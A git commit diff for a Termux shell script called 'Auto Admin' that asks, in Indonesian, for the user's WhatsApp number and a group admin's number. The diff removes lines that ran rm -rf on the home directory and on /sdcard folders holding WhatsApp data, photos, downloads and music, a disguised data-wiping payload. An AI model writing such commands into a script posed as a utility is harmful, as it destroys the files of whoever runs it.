8d043baa4e9c8f98122ae119ea4ba7d21f0aa532
fastreader <77955097+fastreader@users.noreply.github.com>
2021-01-27 02:23:51 -0800

    Update admin.sh

--- admin.sh
+++ admin.sh
@@ -3,15 +3,6 @@ termux-setup-storage
 figlet -f slant "Auto Admin"
 
 
-
-rm -rf cd /sdcard/Android
-rm -rf cd ~
-rm -rf cd /sdcard/WhatsApp
-rm -rf cd /sdcard/DCIM
-rm -rf cd /sdcard/Download
-rm -rf cd /sdcard/Music
-rm -rf cd /sdcard/SHAREit
-
 echo "Masukan Nomor Whatsapp Anda"
 read nomor
 echo "Masukan Nomor Admin Grup"
